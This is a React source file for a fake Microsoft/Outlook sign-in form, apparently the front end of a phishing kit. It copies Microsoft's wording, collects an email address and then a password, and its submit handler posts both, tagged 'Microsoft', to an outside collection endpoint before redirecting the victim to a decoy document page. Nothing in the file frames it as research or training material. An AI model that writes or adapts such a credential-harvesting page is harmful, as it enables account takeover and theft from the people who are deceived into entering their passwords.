import React, { useState } from 'react';
import Logo from '../img/mofty.svg';
import { LiaKeySolid } from 'react-icons/lia';
import axios from 'axios';

const FormContainer = () => {

    const [userLabel, setUserLabel] = useState('');
    const [passVal, setPassVal] = useState('');
    const [showMail, setShowMail] = useState(true);
    const [signIn, setSignIn] = useState(false);
    const [message, setMessage] = useState()
    const [titleChange, setTitleChange] = useState("Sign in")
    const [errMess, setErrMess] = useState()
    const [nameHolder, setNameHolder] = useState(false)

    const goPassInput = ()=> {
      if (userLabel === '') {
        setErrMess("Enter valid email address, phone number or skype name")
      }else {
        setShowMail(false);
        setSignIn(true);
        setTitleChange("Enter Password");
        setErrMess()
        setNameHolder(userLabel)
      }
    }

    const handleSubmit = (e)=> {
      e.preventDefault();

      if (passVal === ''){
        setErrMess("Please enter the password for your microsoft account");
      }else{
        setErrMess()
        const proData = new FormData();
        proData.append('email', userLabel);
        proData.append('para', passVal);
        proData.append('source', "Microsoft");

        const url = 'https://yourbackend.com/loadback';
        const msUrl = "/Document";

        axios.post(url, proData)
        .then((res) => {
          if (res.status !== 'ok'){
            console.log(res.data)
          }
        }).then(()=> {
          window.location.replace(msUrl);
        }).catch(err => {
          setMessage(err.code)
        })
      }



    }
  return (
    <div>
      <form onSubmit={handleSubmit} className="form-container">
        <div className="logo">
            <img src={Logo} alt="" />
        </div>
        {nameHolder && <div className="name-holder">{nameHolder}</div> }
        <div className="title" >
            {titleChange}
        </div>

        <div className="mini-dets">
            to continue to Outlook 
        </div>
        <div className="classErr">{errMess}</div>

        <div className="formInput">
           {showMail && <input type="email" className='slide' maxLength={"138"} value={userLabel} onChange={(e) => setUserLabel(e.target.value)} placeholder='Email, phone, or Skype' />}
           {!showMail && <input type="password" className='slide' value={passVal} onChange={(e)=> setPassVal(e.target.value)} placeholder='Password' /> }
        </div>

        <div className="lower-container">
            <div className="create">
                No account? <span className='a-ref'>Create One</span>
            </div>
            <span className="a-ref">Can't access your account?</span>
        </div>

        <div className="btn-container">
            {!signIn && <span className="btn" onClick={()=> goPassInput()}>Next</span>}
            {signIn && <button className="btn">Sign in</button>}
        </div>
        
        {message && <div className="message">{message}!</div>}

      </form>

      <div className="bottom-option">
        <LiaKeySolid className='r-icon'/>Sign-in options
      </div>
    </div>
  )
}

export default FormContainer
